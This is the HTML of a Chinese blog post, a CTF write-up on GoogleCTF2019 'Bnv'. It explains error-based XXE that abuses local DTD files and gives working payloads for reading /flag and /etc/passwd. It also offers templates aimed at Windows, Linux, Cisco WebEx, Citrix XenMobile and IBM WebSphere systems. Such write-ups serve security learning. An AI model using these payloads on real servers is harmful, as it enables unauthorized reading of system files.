@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"550532788.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x00 前言​    这一段正好在学Java和XXE。今天刚好做到了[GoogleCTF2019 Quals]Bnv。看了WriteUp之后感觉自己又学到了好多。在这里记录一下吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从Bnv开始的XXE漫谈">
+<meta property="og:url" content="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/index.html">
+<meta property="og:site_name" content="Cxlover&#39;s blog">
+<meta property="og:description" content="0x00 前言​    这一段正好在学Java和XXE。今天刚好做到了[GoogleCTF2019 Quals]Bnv。看了WriteUp之后感觉自己又学到了好多。在这里记录一下吧。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88.assets/image-20200516135325888.png">
+<meta property="og:image" content="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88.assets/image-20200516141018340.png">
+<meta property="article:published_time" content="2020-09-18T09:00:00.561Z">
+<meta property="article:modified_time" content="2020-09-18T09:00:00.561Z">
+<meta property="article:author" content="Cxlover">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88.assets/image-20200516135325888.png">
+
+<link rel="canonical" href="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>从Bnv开始的XXE漫谈 | Cxlover's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cxlover's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://550532788.github.io/2020/09/18/%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200826022332avatar.gif">
+      <meta itemprop="name" content="Cxlover">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxlover's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从Bnv开始的XXE漫谈
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-18 17:00:00" itemprop="dateCreated datePublished" datetime="2020-09-18T17:00:00+08:00">2020-09-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    这一段正好在学<code>Java</code>和<code>XXE</code>。今天刚好做到了<code>[GoogleCTF2019 Quals]Bnv</code>。看了<code>WriteUp</code>之后感觉自己又学到了好多。在这里记录一下吧。</p>
+<a id="more"></a>
+
+<h3 id="0x01-例题"><a href="#0x01-例题" class="headerlink" title="0x01 例题"></a><code>0x01</code> 例题</h3><p>​    首先进入题目的界面，发现这一题使用的是<code>json</code>传输。然后大佬就联想到了<code>json</code>转化为<code>xxe</code>进行文件读取？这是什么逻辑？找了资料之后才看懂一点。先看一下数据包的结构吧。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: af6756fc-f568-4cb8-a6cb-be843e5a7c01.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Origin</span>: http://af6756fc-f568-4cb8-a6cb-be843e5a7c01.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line"><span class="attribute">Content-type</span>: application/json</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Referer</span>: http://af6756fc-f568-4cb8-a6cb-be843e5a7c01.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"message":"135601360123502401401250"&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    因为<code>Content-Type</code>头是<code>application/json</code>。所以服务器所收到的是<code>json</code>数据。而如果我们修改为<code>application/xml</code>那么服务器默认会以为收到的是<code>xml</code>格式的数据，而如果我们发送的不是这个格式，那么肯定会报错的啊。会爆出下面的错误：</p>
+<p><img src="%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88.assets/image-20200516135325888.png" alt="image-20200516135325888"></p>
+<p>​    如果出现类似的错误，即大概意思是xml文件的格式不对的，它的服务器变相的卖出它自己可以解析<code>xml</code>文件。所以我们可以尝试<code>xxe</code>。顺便一提，这里好像是只有使用<code>java</code>作为后端才会可能出现这样的情况。选择<code>POST</code>下面的数据看看有没有回显：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">REQUEST:</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>name<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">RESPONSE:</span><br><span class="line">Validation failed: no DTD found !, line 2, column 6</span><br></pre></td></tr></table></figure>
+
+<p>​    发现没有<code>.dtd</code>文件。所以这里我们需要一个可以利用的<code>.dtd</code>文件，而<code>xxe</code>中有一个点我之前没有学，这里刚好补上（泪目，看来什么都要学啊）。就是本地去找<code>.dtd</code>文件然后使用本地<code>.dtd</code>文件上传造成<code>xxe</code>。那么直接贴上这道题目的<code>payload</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        '</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    获得<code>flag</code>。</p>
+<p><img src="%E4%BB%8EBnv%E5%BC%80%E5%A7%8B%E7%9A%84XXE%E6%BC%AB%E8%B0%88.assets/image-20200516141018340.png" alt="image-20200516141018340"></p>
+<p>​    但是做习题的时候<code>flag</code>根本就不是我们的目的。我们来具体的分析一下（指留下白嫖的<code>POC</code>）。</p>
+<h3 id="0x02-POC"><a href="#0x02-POC" class="headerlink" title="0x02 POC"></a><code>0x02</code> <code>POC</code></h3><p>​    其实这种<code>xxe</code>类似于报错注入，毕竟都是通过报错把，数据给带出来的。如果服务器和你的主机之间没有防火墙的话，你当然可以通过<code>Blind XXE</code>的基础用法来读取文件。但是如果有，那么我们就只剩下报错利用了。上面的<code>POC</code>只是基于<code>linux</code>下的<code>POC</code>，那么其他平台下我们该怎么办呢？</p>
+<p>模板（自己的模板，不一定对，如果不行记得去多试几遍大佬的）：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % ISOamsa '</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">        '&gt;</span><br><span class="line"></span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Windows:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:\Windows\System32\wbem\xml\cim20.dtd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">SuperClass</span> <span class="meta-string">'&gt;Your DTD code&lt;!ENTITY test "test"'</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>linux:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">'Your DTD code'</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>Cisco WebEx:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">url</span>.attribute.set <span class="meta-string">'&gt;Your DTD code&lt;!ENTITY test "test"'</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>Citrix XenMobile Server:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">Body</span> <span class="meta-string">'&gt;Your DTD code&lt;!ENTITY test "test"'</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>多平台 IBM WebSphere 应用:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"./../../properties/schemas/j2ee/XMLSchema.dtd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xs-datatypes</span> <span class="meta-string">'Your DTD code'</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">simpleType</span> <span class="meta-string">"a"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">restriction</span> <span class="meta-string">"b"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">boolean</span> <span class="meta-string">"(c)"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">URIref</span> <span class="meta-string">"CDATA"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">XPathExpr</span> <span class="meta-string">"CDATA"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">QName</span> <span class="meta-string">"NMTOKEN"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">NCName</span> <span class="meta-string">"NMTOKEN"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">nonNegativeInteger</span> <span class="meta-string">"NMTOKEN"</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>​    最后简单的介绍一下原理吧。</p>
+<h3 id="0x03-原理"><a href="#0x03-原理" class="headerlink" title="0x03 原理"></a><code>0x03</code> 原理</h3><p>​    看着下面的<code>XXE</code>攻击方法，如果不包含外部实体的话是不是无法理解：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    错误原因是：外部<code>DTD</code>允许我们在第二个实体中包含一个实体，但它在内部<code>DTD</code>中被禁止。但是如果使用本地的<code>DTD</code>文件为什么就可以了呢？</p>
+<p>​    本地的<code>DTD</code>文件起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。这么说可能还有人不太懂（就是当初的我），举个大佬的例子吧。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ELEMENT aa (bb'</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>sip-app_1_0.dtd</code>文件中的内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">…</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">"and | or | not | equal | contains | exists | subdomain-of"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">pattern</span> (%<span class="meta-keyword">condition</span>;)&gt;</span></span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+
+<p>​    所以我们定义了两个具有相同名称的实体<code>condition</code>。而只使用第一个实体使我们可以完成<code>XXE</code>。</p>
+<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a><code>0x04</code> 参考</h3><p><code>使用本地DTD文件来利用XXE漏洞实现任意结果输出</code></p>
+<p><a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195899.html</a></p>
+<p><code>通过Google CTF的BNV学习一下XXE</code></p>
+<p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2019/07/14/50.html</a></p>
+<p><code>神奇的Content-Type——在JSON中玩转XXE攻击</code></p>
+<p><a href="https://www.cnblogs.com/blacksunny/p/7891495.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/7891495.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/26/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B/" rel="prev" title="浅谈php反序列化的参数类型">
+      <i class="fa fa-chevron-left"></i> 浅谈php反序列化的参数类型
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-例题"><span class="nav-number">2.</span> <span class="nav-text">0x01 例题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-POC"><span class="nav-number">3.</span> <span class="nav-text">0x02 POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-原理"><span class="nav-number">4.</span> <span class="nav-text">0x03 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-参考"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cxlover"
+      src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200826022332avatar.gif">
+  <p class="site-author-name" itemprop="name">Cxlover</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://xzlang.github.io/" title="https:&#x2F;&#x2F;xzlang.github.io&#x2F;" rel="noopener" target="_blank">Xzlang's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0xdktb.top/" title="http:&#x2F;&#x2F;0xdktb.top&#x2F;" rel="noopener" target="_blank">0xDktb's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.d3vil.top/" title="http:&#x2F;&#x2F;www.d3vil.top&#x2F;" rel="noopener" target="_blank">d3vil's  Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
